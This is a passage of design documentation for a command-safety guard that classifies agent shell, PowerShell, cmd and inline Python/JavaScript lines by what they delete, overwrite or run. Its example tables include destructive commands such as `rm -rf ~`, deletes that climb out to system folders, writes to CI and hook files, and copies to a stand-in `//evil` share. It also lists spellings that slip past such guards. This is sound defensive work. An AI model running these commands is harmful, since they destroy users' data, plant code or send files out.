- `~` is the home directory. `~user` is another user's, which the spelling
  does not say, so it is unknown.
- `$HOME`, `%USERPROFILE%` and `$env:TEMP` are the places they name.
- A PowerShell word that is a variable and a path (`$HOME\.agent\config.yaml`,
  `$env:USERPROFILE/x`, `${HOME}\x`) is an expandable string. The grammar
  fails on it, so the line is `unreadable` as it ever was; and it is read
  again with such words put in double quotes (a word of plain path characters
  after a name, where a word can begin; a line with a here-string, or a
  subexpression in a string, is read as written), so that the rules see the
  paths. What the second reading finds is added; the line stays `unreadable`.
- A PowerShell drive such as `HKLM:` is the registry. Any other drive, such as
  `Env:`, is outside the workspace. The drive is read before a wildcard, so
  `HKCU:*` is the registry like `HKCU:\*`.
  A drive's name is whatever comes before the first `:` when that holds no
  `/`, `\`, `.` or `~`, no separator and no wildcard, so a drive made with `New-PSDrive`
  (`my_drive:*`, `my-drive:\*`) is a drive, outside the workspace, and
  `x.txt:stream` is a file's stream, not a drive.
- The item cmdlets are judged by where their path lands, as `Remove-Item` is:
  `Clear-Item`, `Rename-Item`, `Set-Item`, `New-Item`, `Move-Item`,
  `Copy-Item` (its destination), the `-ItemProperty` cmdlets and their
  aliases. A registry place is `system_settings`: `Clear-Item HKCU:\Software\x`,
  `Rename-Item HKCU:\Software\x y`, `Set-Item HKLM:\SYSTEM\x -Value 1`. A
  rename or move of what lies beyond the workspace is `delete`, and a
  `Set-Item` or `Clear-Item` on another drive (`Env:`, `Variable:`) is
  `overwrite`, as writing to it is. `Rename-Item src\a.rs b.rs` is safe, but a new name only known when it runs
  (`Rename-Item src\a.rs $name`, `-NewName { $_.Name + 'x' }`) is `overwrite`,
  as it may be a startup file's. With
  no path, the four that act on an item work on what the stage before lists (or `$_`), except that a
  listing of the whole workspace by `Get-ChildItem`, `ls` or `dir`, or a
  `Get-Item` pattern such as `Get-Item *`, is its contents, not the workspace
  itself; `Get-Item .` or `Get-Item D:\ws2` hands on that folder, as written.
  `Clear-Item` and `Set-Item` take a list of paths, so each
  `-Path`/`-LiteralPath` value and each positional is judged
  (`Clear-Item src\a, HKCU:\Software\y`, `Set-Item src\a, HKLM:\x`).
  `Rename-Item`'s `-Path` and `-LiteralPath` take one string, so a list there
  makes the command fail; every positional is judged all the same, because
  the guard cannot tell which is the item when a bare `-n`, a `--` or a
  splat (`Rename-Item y @p`, where `@p` may hold `-Path`) hides it. The
  value of `Set-Item` and the new name of `Rename-Item` are judged as places
  too, since one that is a place of its own makes the command fail. The one
  exception is a new name made at run time (`Rename-Item src\a.rs $name`)
  after the first positional, which is not judged as an item (it is still an
  `overwrite`, as above), unless one of those leaves it unclear
  (`Rename-Item -n y HKCU:\Software\x`). `-PSPath` and `-LP` are
  `-LiteralPath`, so `Rename-Item y -PSPath $p` renames `$p`, and
  `Clear-ItemProperty y -PSPath HKCU:\Software\x` is the registry. `Move-Item` judges every
  source: each `-Path`/`-LiteralPath` value and every positional but the
  destination, which is `-Destination` or else the last positional
  (`Move-Item -Path src\a,C:\Windows\x -Destination src\d`). `New-Item` judges
  every positional when no `-Path` is named (only `-Path` is positional, so an
  extra one only makes the command fail), and `-Type` and `-PropertyType` take
  a value. The `-ItemProperty` cmdlets judge their first positional and every
  known one, and every positional when a bare parameter that may take a value
  (`-n`), a `--` or a splat leaves the path unclear
  (`Clear-ItemProperty -n a HKCU:\Software\x`). A `--` is never a path. A
  splat is `@` and a variable name (`@p`, `@args`); `@(...)` and `@{...}` are
  not one. `Copy-Item` and
  `Move-Item` judge a splat as a possible destination when no `-Destination` is
  named (`Copy-Item @p`, `Copy-Item @p src\a`). A `Get-ChildItem` listing reads
  `-s` (`-Recurse`), `-ar` (`-ReadOnly`) and `-Name` as switches, so they do
  not take the folder listed (`gci -s HKCU:\Software | Clear-Item`). A
  `Get-ChildItem` or `Get-Item` listing that is `-Force`, `-Hidden` (`-ah`)
  or has an `-Attributes` value that may name hidden files (`Hidden`, `h`,
  `!Directory+Hidden`, or one it cannot read) hands on
  the hidden files of the workspace (`.git`) too, so
  `Get-ChildItem -Force | Rename-Item -NewName x` is a `delete`, as
  `Rename-Item .git x` is. A filter on such a listing is judged against the
  folder: a `-Filter` or `-Include` pattern that can match `.git`
  (`*`, `.g*`, `.git`) hands on `.git`. A `-Filter` is also matched by the file
  system against the 8.3 short name, `GIT~1` on the system drive, so `-Filter
  g*`, `*~1`, `GIT~?` and `?????` hand on `.git` too, read as cmd reads a
  wildcard, DOS wildcards included: `<` is a `*`, `>` a `?` that can match
  nothing, and `"` a `.` that can match nothing (`-Filter .gi<`, `<`), and a `.`
  followed by `*` or `?` can match nothing too (`-Filter HEAD.*.*` finds `HEAD`) (`-Include`
  is PowerShell's own matching, against the long name only, where these are
  plain characters). A recursive
  listing (`-Recurse`, `-Depth`) searches the folders below, so
  `-Filter config` finds `.git\config`: it hands on `.git` when a pattern can
  match one of the names `.git` holds: a top-level entry or file (`HEAD`,
  `config`, `index`), a folder below the top (`pack`, `heads`, `tags`,
  `remotes`, and the default remote `origin`), `stash` (the only reference
  to every stash entry), a branch named `main` or `master`, or an object by the shape of its name, asked as "can this pattern
  match some string of n hex digits": a loose object's folder (two digits,
  `??`), its file (thirty-eight, `1*`, `*7*`) and a pack (`pack-` and forty
  digits, then `.pack` or `.idx`); and every hidden folder when a pattern is
  not known. `bin`, `obj`, `node_modules`, `Debug`, `*.tmp`, `*.orig` and
  `*.log` hold a letter that is not a hex digit, or a dot, so they match none
  of these.
  `-Force -Filter *.tmp | Move-Item -Destination trash` stays safe, and
  `-Exclude` leaves the listing whole. So the everyday clean-ups
  `-Include bin,obj -Recurse -Force | Remove-Item -Recurse -Force`,
  `-Recurse -Force -Directory -Filter node_modules` and
  `-Force -Recurse -Include *.tmp` stay safe, as do `-Filter *.log | Remove-Item`
  and `-Recurse -Include *.tmp | Remove-Item` without `-Force`.
  `-Depth` and `-Attributes` take a value, which is never read as the path.
  A common parameter's value (`-ErrorAction 0`) is never read as the path.
- A drive-relative path (`C:x`, `C:*`: a letter, a colon, and no separator) is
  from that drive's own working directory, and so is a bare `C:`. In
  PowerShell, on the drive the working directory is on, it is relative to it;
  on any other drive it is outside the workspace. After a `cd` it is unknown,
  except that after `cd C:` a relative path is `C:x`, a path on that drive.
  cmd keeps a working directory for every drive and the line never shows where
  each one is, so in cmd three rules hold:
  - `cd` and `chdir` without `/d` to a path on another drive set that drive's
    own working directory and do not move the line, so `cd D:\ws\a\b\c & rd /s
    /q ..\..` from `C:\Users\me\repo` deletes `C:\Users`. `/d`, `pushd` and a
    drive switch (`D:`) change the drive, and `cd D:` alone moves nothing. A
    move to another drive may not have run (a branch, a pipe stage, a `cd /d`
    that fails), so after one the drive is a guess: a `cd` without `/d` to a
    path on a third drive leaves the folder unknown, as does any `cd` while the
    drive is not known (after `popd`, a path or a program only known when it
    runs, `/d` written other than first).
  - Every drive-relative path is unknown, on the drive the line is on or on
    another: `D:x`, `D:..\x`, `D:` and `C:x` are never safe to delete or
    write. Read from the line's own folder, one that lands on a key or another
    protected place is still judged as that.
  - A `cd`, `chdir` or `pushd` with more than one word (`cd My Folder`) goes to
    the words joined as written, the spaces between them kept and none after
    the last. The folder is unknown when any word is only known when it runs,
    or a later word is `/d`.
- A listing hands its pattern on as written, so it is read the same way: the
  drive is not part of the pattern (`Get-ChildItem C:* | Remove-Item` takes the
  whole working directory), and a provider-qualified one
  (`Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER*`) is judged on the
  provider's own path.
  A drive's root listed (`C:\*`) is the root, not the drive's working directory.
- `del /s` and `erase /s` search every folder below the one they start in.
  From the workspace folder, a name pattern that can match one of the files
  `.git` holds (`HEAD`, `config`, `index`, `packed-refs`, `description`,
  `COMMIT_EDITMSG`, `stash`, a branch named `main` or `master`), a folder below its
  top (`pack`, `heads`, `tags`, `remotes`, `origin`), or an object by the
  shape of its name (a loose object's two-digit folder, its thirty-eight-digit
  file, a `pack-` and forty hex digits with `.pack` or `.idx`) is a
  `delete`: `del /s /q HEAD`, `del /s /q *.` (every name without an
  extension), `del /s /q ?????`, `del /s /q 1*`, `del /s /q *7*`.
  `del /s /q *.obj`, `*.tmp`, `*.pyc`, `bin`, `obj` and
  `Thumbs.db` stay safe, and so does a pattern started deeper in the
  workspace (`del /s /q src\HEAD`), since only the workspace's own `.git`
  is the model's to protect. Without `/s` the name is one file in the folder
  (`del HEAD` is safe). Whether `del /s` descends into hidden folders has
  not been checked on a Windows machine; it is taken to, since a false safe is
  the worse mistake, and the rows relax if it is found not to. The pattern is
  read by cmd's rules, not PowerShell's: a `.` followed by `*` or `?`
  also matches nothing, as cmd's DOS dot does (`del /s /q main.*` takes the
  branch `main`, `del /s /q HEAD.*.*` takes `HEAD`), a run of `?` at the end or just before a `.` can match
  nothing (`HEAD?`, `????????`), cmd's DOS wildcards are read (`<` is a
  `*`, `>` a `?` that can match nothing, `"` a `.` that can match nothing:
  `del /s /q "HEA>"`, `del /s /q "<"`), and the 8.3 short names of the long ones are
  tried too (`*.pac`, `COMMIT~1`, `PACKED~1`, and six hex digits with `~1` for
  a loose object), since the system drive creates them. `main.obj`, `*.obj`, `*.log` and `*.orig` stay safe. Only the names
  listed, their short forms and the hex shapes are tried, so a pattern that
  fits some other branch name (`dev`) is not told.
- A PowerShell provider-qualified path (`FileSystem::C:\x`) is its provider's
  own path. A relative one (`FileSystem::x`,
  `Microsoft.PowerShell.Core\FileSystem::x`) is from the folder the line is in,
  as a plain one is (`cd C:\Windows; Remove-Item -Recurse FileSystem::System32`
  deletes `C:\Windows\System32`); after a `cd` to another provider, or to a
  place only known when it runs, it is only known when it runs.
- A path built at run time, or by a brace list such as `{~,x}`, is unknown.
- `NUL` is the null device in any folder, and so is PowerShell's `$null` value (see "Where a line is"); in PowerShell a bare `NUL` or `CON` is one only on the file system. In a POSIX shell `$null` is the variable `null`, only known when it runs; in cmd, and quoted in PowerShell, it is a file name. In a longer PowerShell word `$null` is the empty string: `$null\Windows` is `\Windows`, a folder at the top of the disk.
- In PowerShell and cmd a name is read the way Windows reads it: `.git.`, `.git `
  and `GIT~1` are the repository's history, and `x.txt:stream` is known only
  when it runs (see [Core](core.md#what-core-judges)).
- **A cmd argument that starts with `/` is a switch only by its shape**: a
  switch name (letters, digits, `-`, `+` and `?`: `/q`, `/-y`, `/?`, `/mir`),
  or a run of names of at most three characters each (`/s/q`), each with an
  optional `:value` (`/a:-d`, `/R:3`, `/a:h/s/q`). Anything else is a path,
  judged where it lands, which can only be stricter than a switch: a text that
  starts with two separators (`//evil/share/x`, `//?/C:/Windows`, `/\evil\s`)
  is a share or a long path, as its backslash spelling is, so `del
  //evil/share/x` and `del /s /q //?/C:/Windows` are `delete` and `copy x
  //evil/s` is `overwrite`; one core reads as a device (`/dev/sda`) is that
  device; one with a `\` or a `.`, a run with a longer part
  (`/evil/share/x`), or a value that holds a separator or starts with a drive
  (`del /a:C:/Windows`) is a path. A built-in command splits an argument at
  `,`, `;` and `=` first, and each part is a switch or a path of its own
  (`del /q;//evil/s`). cmd's built-ins (`del`, `rd`, `copy`, `move`, `ren`,
  `md`, `mklink`) and `xcopy` take only their own switch names, every name of
  a run among them: cmd never reads a quoted word as a switch and the guard
  no longer sees the quotes, so `rd /s /q "/Users"` deletes the folder
  `\Users` and is `delete`, as is `rd /s /q /Users`. A switch whose value
  names a file has the value judged: `xcopy /exclude:` reads a list of
  strings to skip and is no operand;
  `robocopy`'s `/LOG:`, `/LOG+:`, `/UNILOG:` and `/UNILOG+:` write a log and
  `/SAVE:` a job file (the name and `.rcj`), each judged as a write
  (`robocopy a b /LOG:C:\Users\me\.bashrc` is `overwrite`, and so is
  `/LOG:%X%`, a write to a place known only when it runs); `/JOB:` copies
  by a job file the guard never reads, so it is `unknown`.

Inside a workspace or a temporary directory is the agent's own. Not the agent's
own: the home directory, a system folder, the root of a disk, the workspace
itself, its `.git`, keys and shell startup files, and the paths the caller
protects.

### Files a tool runs on its own

A workspace holds files that something runs without anyone typing a command:
`.vscode/tasks.json` (the editor), `.envrc` (direnv, on `cd`), `.husky/*` and
`.pre-commit-config.yaml` (git hooks), `.github/workflows/*` and
`.gitlab-ci.yml` (CI, with the repository's secrets), `.devcontainer/*` (the
container build), `.mcp.json` (servers an editor starts) and the rest of
core's list (see [Core](core.md#what-core-judges)), at any depth. A line that
writes one is `overwrite` with the reason `writes to a file a tool runs on its
own` (the verb of the line: `edits` for `sed -i`, `creates` for `touch`). The
rule is the same as for every sensitive place: core's `place_into` answers it,
so every writer the guard knows (a redirect, `tee`, `cp`, `mv`, `ln`,
`install`, `rsync`, `sed -i`, `perl -i`, `dd`, `curl -o`, `Set-Content`,
`Out-File`, `Copy-Item`, `copy`, `xcopy`, ...) finds it without a rule of its
own.

| Line | Verdict |
| --- | --- |
| `echo x > .envrc`, `tee .vscode/tasks.json`, `cp a .github/workflows/ci.yml`, `sed -i s/a/b/ .husky/pre-commit`, `Set-Content .envrc x`, `copy a .gitlab-ci.yml`, `echo x > VSCODE~1\TASKS~1.JSO` | `overwrite` |
| `cd .github/workflows && cp a ci.yml`, `echo x > .ENVRC`, `echo x > $'.\x65nvrc'`, `echo x > src/deep/.envrc` | `overwrite`: a `cd`, case, quotes and depth are read |
| `cp lefthook.yml sub/`, `cp -t .vscode a/tasks.json`, `mv a/.envrc sub/` | `overwrite`: the file lands at its own name in a folder that is one for certain (a trailing separator, `.`, `..`, `-t`, several sources) |
| `cp -r a .github`, `cp -a a .vscode`, `rsync -a a/ .github/`, `xcopy /s a .github`, `Copy-Item -Recurse a .vscode` | `overwrite`: a recursive copy can replace anything below a folder that holds one |
| `sed -i s/a/b/ .github/workflows/*.yml`, `sed -i s/a/b/ .vscode/*.json`, `sed -i s/a/b/ */Jenkinsfile`, `sed -i s/a/b/ *.yml` | `overwrite`: a pattern that can pick one |
| `cat .envrc`, `grep x .github/workflows/*`, `cp .envrc /tmp/x`, `rm .envrc`, `rm -rf .husky`, `mv .envrc /tmp/x`, `chmod +x .husky/pre-commit` | safe: a read, a delete or a move away of one is not a write that plants code |
| `echo x > Makefile`, `sed -i s/a/b/ package.json`, `echo x > justfile`, `echo x > .vscode/extensions.json` | safe: they only run when someone asks |
| `ren a .envrc`, `rename a .envrc`, `Rename-Item a .envrc`, `Rename-Item -Path a -NewName .envrc`, `rni .vscode\old.json tasks.json`, `mklink .envrc a`, `mklink /h .envrc a`, `New-Item -ItemType SymbolicLink -Path .envrc -Value a`, `New-Item -Path .vscode -Name tasks.json`, `rename old .envrc old`, `rename 's/^tmp$/.envrc/' tmp`, `ln a .envrc` | `overwrite`: a rename or a link puts a file at the new name, which for a rename is in the source's folder |
| `mkdir -p .github/workflows`, `mkdir .husky`, `md .devcontainer`, `New-Item -ItemType Directory .vscode` | safe: an empty folder is no code, and what is written into it is judged then |
| `cp .envrc .envrc.bak`, `cp -r .vscode backup`, `cp *.yml deploy/`, `sed -i s/a/b/ src/*` | safe: a destination that may be a file is not read as a folder, a source pattern is not read as a name, and a pattern of nothing but wildcards names none |
| `echo x > /home/me/other/.envrc`, `echo x > .git/.envrc`, `echo x > /tmp/x/.envrc` | each keeps its own place: beyond the workspace, the history, a temporary file |

A rename or a link is a write of its destination, as a `mv` or an `ln` is:
`Rename-Item`, `ren`, `rni`, cmd's `ren` and `rename`, `mklink` with any switch,
`New-Item -ItemType SymbolicLink`, `HardLink` or `Junction` (`-Type` too), and
`New-Item -Name` in the folder `-Path` names. A rename's new name is a name,
so it lands in the source's folder (`Rename-Item .vscode\old.json tasks.json`
is `.vscode\tasks.json`); what is renamed away is judged as `mv` judges it. The
same holds for a protected name (`ren a .agent`). POSIX `rename` is read only as
util-linux's `rename [-v|-n|-o|-s|-i|-a] FROM TO file...`, whose new names are
plain text (the first `FROM` in a name, every one with `-a`, becomes `TO`) and
land where the file is. An expression is perl's `rename`, which is code: a
line with fewer than three operands, a first operand that is not plain text
(`s/a/b/`, `y/a-z/A-Z/`, `$_ .= ...`), `-e` and any option outside that short
list (`-l`, `-d`, `--nopath`, `--expr=...`) is `unknown`, "runs code the guard
does not read" or "renames with options the guard does not read", and is never
worked out to a new name. The new name of each of its files is unknown, so each
is an `overwrite` of "a file only known when it runs", and what is renamed away
is a `delete` where it is not harmless (`rename 's/agent/b/' .agent` for a
protected `.agent`). `perl-rename`, `prename` and `file-rename` are only ever perl's, so
any line is read so; `rename.ul` is util-linux's. `rename 's/\.htm$/.html/' *.htm`
is an accepted false alarm.

What it does not read: unpacking an archive, `git checkout`, `git apply`,
`git restore`, `git stash pop` and `patch` can write one without naming it;
a recursive copy into the workspace folder itself, or into a folder that is not
named like the first names of a place on the list, can replace one below it;
`mv dir .github` renames a folder onto a name that holds one.

### Protected paths

A caller names what it gates with (its settings, its rules, the folder it keeps
state in) in `Paths::protected` (see [Core](core.md)), and core answers
`Place::Protected` with the caller's words for it, even inside a workspace.
The guard needs no rule of its own: wherever a rule reads a place it takes
anything that is not harmless, so `Protected` is judged as `Sensitive` is, with
the caller's words in the reason. Reading is not a finding; what a read of a
protected file means is not decided here.

With `Protected::folder("/home/me/.agent", "the agent's settings")`:

| Line | Rule | Reason |
| --- | --- | --- |
| `rm ~/.agent/config.yaml`, `rm -rf ~/.agent` | `delete` | deletes the agent's settings |
| `mv ~/.agent/rules /tmp/x` | `delete` | moves the agent's settings |
| `echo x > ~/.agent/config.yaml`, `cp x ~/.agent/rules` | `overwrite` | writes to the agent's settings |
| `sed -i s/a/b/ ~/.agent/rules` | `overwrite` | edits the agent's settings |
| `chmod 777 ~/.agent/rules` | `permissions` | changes permissions of the agent's settings |
| `cat ~/.agent/config.yaml`, `ls ~/.agent` | safe | |

With the same path inside the workspace (`/home/me/work/repo/.agent`), `rm
.agent/rules` from the repository is a `delete`, `rm src/main.rs` stays safe,
and `rm -rf *` is still a delete of the whole workspace. A PowerShell or cmd
line on `C:\Users\me\.agent` is judged the same way, without regard to case
(on every host: `rm -rf .AGENT` is a delete on macOS too), and `AGENT~1` is the
protected name too.

A folder that holds a protected path is protected as well, so the whole folder
cannot be deleted or moved. With `Protected::file("/home/me/work/repo/conf/app/x.yaml", ..)`:

| Line | Verdict |
| --- | --- |
| `rm -rf conf`, `cd conf && rm -rf app`, `mv conf /tmp/x`, `rm -rf c*`, `rm -rf **/x.yaml` | `delete`, in the caller's words |
| `Remove-Item -Recurse conf`, `rd /s /q conf` | `delete`, in the caller's words |
| `touch conf/new.txt`, `rm conf/other.txt`, `rm -rf src`, `cp a.txt conf/`, `cp a.txt conf/app`, `mkdir -p conf/app` | safe: a write into a folder is not a write of it |
| `cp x.yaml conf/app/`, `cp -t conf/app x.yaml`, `mv x.yaml conf/app`, `install x.yaml conf/app/`, `ln -sf other/x.yaml conf/app/`, `cp *.yaml conf/app/`, `Copy-Item x.yaml conf\app`, `Copy-Item y.yaml,x.yaml conf\app`, `copy /y x.yaml conf\app`, `copy y.yaml+x.yaml conf\app` | `overwrite`: the file lands at its own name, which is the protected one |
| `cp -r other/. conf`, `cp -a app conf`, `rsync -a src/ conf/`, `Copy-Item -Recurse src conf`, `robocopy src conf /E`, `xcopy /s /y src conf` | `overwrite`: a recursive copy can replace anything below the folder |
| `rm -rf **/y.yaml`, `rm -rf **/*.rs` | safe: a protected file has nothing below its name (with a protected folder `cfg` they are `delete`) |
| `rm -rf .`, `rm -rf ~` | the workspace, the home directory: a risky place keeps its own words |

How the copy reads its operands: `Copy-Item` and `Move-Item` bind `-Path` at
position 0 and `-Destination` at position 1, and a comma list of sources is
flattened into the arguments, so with no `-Destination` each operand after the
first is read as the destination in turn, the rest as sources, and a risky
reading wins. The value of a parameter, a common one included (`-ErrorAction
Stop`, `-ea 0`, `-OutVariable o`), is never an operand. A source that comes
only from a pipeline (`gci src | cpi -Destination conf\app`), is unknown, or
is what `find -exec`, `-execdir` or `-ok` found (`{}`) lands as a name that
could be anything, which a protected name in the folder can be. The rows are
all kept in `tests/protected.rs`.

A wildcard part stands for one entry, so a `..` after it still climbs:
`src/*/../../../x`. A part that starts with `.` can match `.git`; in PowerShell
and cmd, whose wildcards also match a leading dot, so can a part directly in
the workspace folder that fits the name (`*git`, `?git`, `*\objects`), though
`*\bin` cannot. A pattern whose last part is a catch-all (`*`, `?*`, `*/*`, and
`*.*` on Windows) takes the whole folder. One that picks names (`*.log`,
`*/*.o`) touches files inside it. [Core](core.md) has the rule.

## Inline code

Python and JavaScript given inline are read with their own tree-sitter
grammars, by the `milo-guards-code` crate ([Code](code.md)), and judged with the
same rules and the same path model as the shell commands that do the same. The
shell guard finds the code on a line (`inline`, apart from the shell
splitters) and turns what the reader found into its own units and findings
(`inline/apply.rs`); it depends on the crate behind its `inline` feature, on by
default. With the feature off the line is still found, but none of the code is
read and no grammar is built: every inline line is `unknown` with the reason
`runs code the guard does not read fully`, whatever the code is (a delete in it
is not said), and a module an option loads (`--import`, `-r`, `NODE_OPTIONS`,
`PYTHONPATH`) is never told from the workspace's own, so it is `unknown` too.
`just no-inline` builds that and holds it (`tests/inline_off.rs`). Two
questions are answered apart:

- **What the code is found to do.** The reader finds the calls that delete,
  write, move and run, and the paths they name; those come out as the units
  and paths the rules already read (a delete is `rm -rf PATH`, a move `mv`, a
  copy a write to its destination, a command line a script `sh -c` reads), so
  no rule knows a language. What it finds is kept wherever the code comes
  from and however it is written: `delete`, `overwrite`, `read_secret` and
  the rest are said whenever the reader is certain of them.
- **Whether a line it finds nothing in is safe.** Only code read whole is. A
  line with inline code that is not read whole, and has no finding of its own,
  is `unknown`, with the reason `runs code the guard does not read fully` and
  the start of the code as the target. It is said once for the line, and not
  when the line already has a finding, which already asks.

**Read whole.** A line with inline code is safe only when all four hold:

1. **The code is written whole on the line**, as the one word after its flag:
   `python -c CODE` (`python3`, `python3.12`, `python2`), `node -e CODE`
   (`nodejs`; also `-p`, `--eval`, `--print`), `bun` the same, `deno eval CODE`.
   Code handed by a here-document, a here-string, a pipe or a redirect
   (`python3 -`, `python3 - <<'PY'`, `node <<< 'code'`, `bun -`, `deno run -`,
   `python3 /dev/stdin`) is never read whole.
2. **Nothing is set around the interpreter.** No option and no argument but the
   flag and the code (`python3 -X dev -c`, `-I`, `-u`, `-W ignore`, `node -r`,
   `--import`, `--loader`, `--input-type`, `--no-warnings`, `bun --cwd`,
   `deno eval -A`, `python3 -c CODE arg`); no assignment in front of it
   (`FOO=1 python3 -c …`, `PYTHONPATH=… `, `NODE_OPTIONS=…`, `LD_PRELOAD=…`);
   no wrapper that may hand it an environment (`env`, `sudo`, `xargs`, also
   in front of a shell that starts it: `FOO=1 bash -c 'python3 -c …'`; `time`,
   `nice`, `timeout` and the like only change how it runs), and no package
   runner (`npx`, `npm exec`, `pnpm exec`, `pnpm dlx`, `bunx`, `bun x`, `uvx`,
   `uv run`, `pipx run`, `deno x`, `dx`), which puts a venv or
   `node_modules/.bin` on `PATH`, passes its config on as environment
   variables and loads `--env-file`; and no `export`, `declare`, `typeset`,
   `readonly`, `local`, `set`, `source`, `.`, `read`, `let`, `mapfile`,
   `readarray`, `getopts`, `unset` or assignment on a line of its own
   (`NODE_OPTIONS=x; node -e …`, `HOME=/elsewhere; python3 -c …`) earlier in
   the line, nor any other way of setting a variable: `printf -v`, the
   variable of a `for` or `select` loop, an arithmetic assignment (`((X=1))`,
   `((X++))`, `$((X=1))`) and a `${X:=v}` or `${X=v}` expansion. A variable
   already exported (`PATH`, `HOME`, and whatever the caller has set) is
   changed for the interpreter, and which are is not known. Nor does the line
   change what the interpreter's name stands for before it: `alias`,
   `unalias`, `hash` (`hash -p /tmp/x/node node` runs any binary), `enable`,
   or a function defined earlier (`node() { NODE_OPTIONS=… command node
   "$@"; }`), none of which the code shows; a function body and an alias's
   value are still read where they are written, and a delete in them is still
   found (`alias python3='rm -rf ~'` is a `delete`).
   An option of `bun run` that carries code (`bun -F x run -e CODE`) is
   an option and a subcommand around the code, not read whole.
3. **The reader understands it** (`milo_guards_code::understand`, the strict
   subset in [Code](code.md#the-strict-subset)). It parses and holds a
   statement (a parse error, `python3 -c 'if 1:'`, code that is empty or only
   comments, and an empty block, `node -e '{}'`, are not read whole); it runs
   straight through, with only expression statements, assignments to a plain
   name and `if` with `else` (no `def`, `class`, lambda, arrow function, loop,
   comprehension, `try`, `with`, `switch`, `match`, `async`, `await`,
   decorator, `new`, spread); every call is a call on a short list that only
   computes (`print`, `len`, `time.time`, `console.log`, `Math.max`, the
   methods of a string or a list) or `open`, which the reader judges by its
   path and mode (a name on the list used as a value, `x = print; x(1)`, is
   not); and no import, run-time code or environment write is outside the
   list (Python imports only the modules built into the interpreter binary,
   plainly: `sys`, `errno`, `itertools` and `time` (only `sys` and `errno`
   for `python2` and `python`, which may be Python 2, where `time` and
   `itertools` are files and `builtins` is `__builtin__`), which the
   import system finds before it looks in the folder the code runs in, so
   nothing there can stand in for them; any other import, `json`, `re` and
   `math` among them, is looked up in that folder first and makes the code not
   read whole, with no table of what each module loads in turn;
   JavaScript has no `import` or `require`; no `eval`, `exec`, `compile` or
   `Function`; no name that starts with an underscore or is not plain ASCII; a
   name the code did not set is not read whole). `os.getcwd()`, `sys.exit()`,
   `input()`, `process.env` and `new Date()` are not on the list.
4. **The folder Python runs in is the workspace's own.** Python puts the folder
   the code runs in ahead of the standard library, so `import json` loads
   `./json.py` from it (which is why it is not read whole, even in the
   workspace: a planted file there would run with no line naming it), and so
   does code with no `import` (an uncaught
   exception imports `traceback`, the `idna` codec imports `stringprep`: this
   is `Understood { imports: true }`). Python code is read whole only when that
   folder is inside a workspace folder, the workspace's own code: the working
   directory, or where the line has moved to by `cd`. After a `cd` out of the
   workspace (`cd /tmp/x && python3 -c 'import json'`, `cd ..`), to a place
   the guard cannot tell (`cd "$X"`, `pushd`, `popd`), or with a working
   directory outside it, the code is not read whole; the same when the code is
   in a function body, a loop or a `trap` and the line moves anywhere, since
   it runs again after the `cd`. So `cd /tmp/x && python3 -c 'print(1)'` is
   not read whole either.

`python3 -c 'print(1+1)'`, `node -e 'console.log(1)'`,
`python3 -c "import sys; print(sys.version)"` and
`python3 -c "open('out.txt','w')"` are safe. `python3 -c 'import json'`,
`cd sub && python3 -c 'import re'`, `python3 -c 'import os;
print(os.getcwd())'`, `node -p 'process.env'`, `python3 -c 'def f(): return 1'`,
`PYTHONPATH=. python3 -c 'print(1)'` and `python3 - <<'PY' … PY` with nothing
found in it are `unknown`. Code outside the four is still read, and a delete,
an overwrite or a key it is found to touch is still said: `python3 - <<'PY'`
with `shutil.rmtree('/home/me')` in it is `delete`. What it is not is safe
because nothing was found.

`effect` never answers `ReadsOnly` for a line with inline code: the interpreter
is not one of its readers (`Unknown`), and a delete, write or command the code
makes is a unit of its own that changes things (`Changes`). `python3 -c
'print(1)'` is safe for `classify` and `Unknown` for `effect`. Every case of
`tests/cases/inline.cases` goes through `effect` with the runner of the case
files, which holds this to `classify`.

**What is found.** Whatever the code comes from, the reader finds the calls
that delete, write, read, move, link, change permissions, run and kill, with
calls found by their name once what `import`, `require` and destructuring bound
is put back (`from os import remove as rm`, `const { rm } = require('fs')`,
`o = os`, `getattr(os, 'remove')`): the table of calls is in
[Code](code.md#what-the-reader-finds). The shell guard turns each act into
the unit that does the same:

A literal command string is split in the shell grammar and judged like a
nested `bash -c`; a literal argument list (`subprocess.run(['rm', '-rf',
'~'])`) is judged as the unit it is, `shell=True` or `{ shell: true }` making
it a command line; `cwd` runs it after a `cd`. A path is a literal string,
`os.path.expanduser('~…')`, `Path.home()`, `os.environ['HOME']`,
`process.env.HOME`, `os.homedir()`, `os.path.join`, `path.join`, `Path(…) / …`,
string `+`, f-strings and template literals made only of those, or a name the
code sets to one (every string a name is set to anywhere is read). Anything
else is a path only known when it runs, as `rm -rf "$DIR"` is: a delete or a
write to it is judged as a place unknown, and a read of it is `unknown`. A read
of a path the code gives whole is judged as `cat PATH` is, so it is a finding
only where the path is a secret (see [Reading a key](#reading-a-key)); a folder
read all the way down (`TarFile.add`, `copytree`, `make_archive`) is judged as
`grep -r` is. A `chdir` moves the code's own paths, not the line's, and is read
where the code runs it: in code that changes directory, each relative path is
judged from every directory the code may be in, and is only known when it runs
when they cannot be told.

**Where the code comes from.** `python`, `python3` (and `python3.12`),
`python2`: `-c`, also in a bundle (`-Sc`) or attached (`-cCODE`). `node`,
`nodejs`: `-e`, `-p`, `--eval`, `--print`; `bun` the same, and `--cwd DIR`;
`deno eval`; every piece of code of several `-e` is read, not the first. A
here-document or here-string of plain text (a quoted delimiter, or one with
nothing in the body the shell would expand) handed to `python3`, `python3 -`,
`node`, `node -`, `bun -`, `bun run -`, `deno run -` is read as code. All of
these are read for what they find, and none but the first kind, written whole
with no option or environment, is read whole. An `-i` (`python3 -i -c`,
`node -i -e`) makes the interpreter go on to read code from its input, which is
`unknown`, as a bare `python3` or `node` is. A script file (`python3
scripts/gen.py`, `node build.js`) is the workspace's own code and is not read.
Neither is code from a pipe or another redirect (`cat x.py | python3`,
`python3 < x.py`), which stays `unknown`, or `run_downloaded` after a download.
Code that PowerShell or cmd hands to an interpreter stays `unknown`: its paths
and commands are not POSIX ones. An interpreter given only a flag that prints
and exits (`--version`, `-V`, `--help`, `-h`) reads no input.

**What the reader itself leaves `unknown`.** Code that does not parse; `eval`,
`exec`, `compile`, `Function` and `vm.*` of anything but a literal string (a
literal is read as code of its language, at any depth, to the same limits as
nested scripts); a library call that runs the code it is given or loads code
(`timeit`, `cProfile.run`, `pickle`, `pdb`, `importlib`); `__import__`,
`getattr`, `import()` and `require` of a computed name; an assignment to a
member of a module, of a builtin class or of `process`, `Deno` or `Bun`; an
alias of a call it cannot follow (`r = os.remove`, `map(fs.unlinkSync, files)`);
a module handed on as a value; a read of a path not fully known
(`open(sys.argv[1])`); a command line or an argument only known when the code
